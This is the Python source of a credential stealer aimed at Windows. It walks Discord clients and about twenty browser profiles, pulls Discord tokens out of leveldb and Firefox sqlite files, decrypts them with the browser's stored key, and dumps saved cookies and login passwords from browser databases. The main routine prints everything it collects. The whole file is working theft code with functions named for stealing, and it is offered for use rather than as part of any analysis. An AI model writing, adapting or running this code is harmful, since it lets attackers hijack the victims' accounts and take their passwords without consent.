import os
import json
import base64
import re
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import requests

APPDATA = os.getenv('LOCALAPPDATA')
LOCALAPPDATA = os.getenv('LOCALAPPDATA')

REGEX = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
REGEX_ENC = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'

def get_paths():
    return {
        "Discord": os.path.join(APPDATA, "discord"),
        "Discord Canary": os.path.join(APPDATA, "discordcanary"),
        "Lightcord": os.path.join(APPDATA, "Lightcord"),
        "Discord PTB": os.path.join(APPDATA, "discordptb"),
        "Opera": os.path.join(APPDATA, "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(APPDATA, "Opera Software", "Opera GX Stable"),
        "Amigo": os.path.join(LOCALAPPDATA, "Amigo", "User Data"),
        "Torch": os.path.join(LOCALAPPDATA, "Torch", "User Data"),
        "Kometa": os.path.join(LOCALAPPDATA, "Kometa", "User Data"),
        "Orbitum": os.path.join(LOCALAPPDATA, "Orbitum", "User Data"),
        "CentBrowse": os.path.join(LOCALAPPDATA, "CentBrowser", "User Data"),
        "7Sta": os.path.join(LOCALAPPDATA, "7Star", "7Star", "User Data"),
        "Sputnik": os.path.join(LOCALAPPDATA, "Sputnik", "Sputnik", "User Data"),
        "Vivaldi": os.path.join(LOCALAPPDATA, "Vivaldi", "User Data"),
        "Chrome SxS": os.path.join(LOCALAPPDATA, "Google", "Chrome SxS", "User Data"),
        "Chrome": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"),
        "FireFox": os.path.join(APPDATA, "Mozilla", "Firefox", "Profiles"),
        "Epic Privacy Browse": os.path.join(LOCALAPPDATA, "Epic Privacy Browser", "User Data"),
        "Microsoft Edge": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"),
        "Uran": os.path.join(LOCALAPPDATA, "uCozMedia", "Uran", "User Data"),
        "Yandex": os.path.join(LOCALAPPDATA, "Yandex", "YandexBrowser", "User Data"),
        "Brave": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data")
    }

def SafeStorageSteal(path: str) -> list[str]:
    encryptedTokens = []
    tokens = []
    key = None
    levelDbPaths = []

    localStatePath = os.path.join(path, "Local State")

    for root, dirs, _ in os.walk(path):
        for dir in dirs:
            if dir == "leveldb":
                levelDbPaths.append(os.path.join(root, dir))

    if os.path.isfile(localStatePath) and levelDbPaths:
        with open(localStatePath, errors="ignore") as file:
            jsonContent = json.load(file)

        key = jsonContent['os_crypt']['encrypted_key']
        key = base64.b64decode(key)[5:]

        for levelDbPath in levelDbPaths:
            for file in os.listdir(levelDbPath):
                if file.endswith((".log", ".ldb")):
                    filepath = os.path.join(levelDbPath, file)
                    with open(filepath, errors="ignore") as file:
                        lines = file.readlines()

                    for line in lines:
                        if line.strip():
                            matches = re.findall(REGEX_ENC, line)
                            for match in matches:
                                match = match.rstrip("\\")
                                if match not in encryptedTokens:
                                    match = match.split("dQw4w9WgXcQ:")[1].encode()
                                    missing_padding = 4 - (len(match) % 4)
                                    if missing_padding:
                                        match += b'=' * missing_padding
                                    match = base64.b64decode(match)
                                    encryptedTokens.append(match)

    for token in encryptedTokens:
        try:
            token = AES.new(key, AES.MODE_GCM, nonce=token[3:15]).decrypt(token[15:])[:-16].decode(errors="ignore")
            if token:
                tokens.append(token)
        except Exception:
            pass

    return tokens

def SimpleSteal(path: str) -> list[str]:
    tokens = []
    levelDbPaths = []

    for root, dirs, _ in os.walk(path):
        for dir in dirs:
            if dir == "leveldb":
                levelDbPaths.append(os.path.join(root, dir))

    for levelDbPath in levelDbPaths:
        for file in os.listdir(levelDbPath):
            if file.endswith((".log", ".ldb")):
                filepath = os.path.join(levelDbPath, file)
                with open(filepath, errors="ignore") as file:
                    lines = file.readlines()

                for line in lines:
                    if line.strip():
                        matches = re.findall(REGEX, line.strip())
                        for match in matches:
                            match = match.rstrip("\\")
                            if not match in tokens:
                                tokens.append(match)

    return tokens

def FireFoxSteal(path: str) -> list[str]:
    tokens = []

    for root, _, files in os.walk(path):
        for file in files:
            if file.lower().endswith(".sqlite"):
                filepath = os.path.join(root, file)
                with open(filepath, errors="ignore") as file:
                    lines = file.readlines()

                    for line in lines:
                        if line.strip():
                            matches = re.findall(REGEX, line)
                            for match in matches:
                                match = match.rstrip("\\")
                                if not match in tokens:
                                    tokens.append(match)

    return tokens

def get_cookies(browser_path):
    cookies = []
    db_path = os.path.join(browser_path, 'Cookies')
    if os.path.exists(db_path):
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT name, value, host_key, path, is_secure, expires_utc, last_access_utc, has_expires, is_httponly, is_persistent, priority, samesite, source_scheme, source_port, is_same_site_lax FROM cookies")
        for row in cursor.fetchall():
            cookies.append(row)
        conn.close()
    return cookies

def get_passwords(browser_path):
    passwords = []
    db_path = os.path.join(browser_path, 'Login Data')
    if os.path.exists(db_path):
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins")
        for row in cursor.fetchall():
            passwords.append(row)
        conn.close()
    return passwords

def steal_browser_data(browser_name, browser_path):
    cookies = get_cookies(browser_path)
    passwords = get_passwords(browser_path)
    return {
        'browser': browser_name,
        'cookies': cookies,
        'passwords': passwords
    }

def main():
    paths = get_paths()
    all_data = {}

    for name, path in paths.items():
        if os.path.exists(path):
            all_data[name] = steal_browser_data(name, path)

    return all_data

if __name__ == "__main__":
    data = main()
    for browser, info in data.items():
        print(f"Browser: {browser}")
        print("Cookies:")
        for cookie in info['cookies']:
            print(cookie)
        print("Passwords:")
        for password in info['passwords']:
            print(password)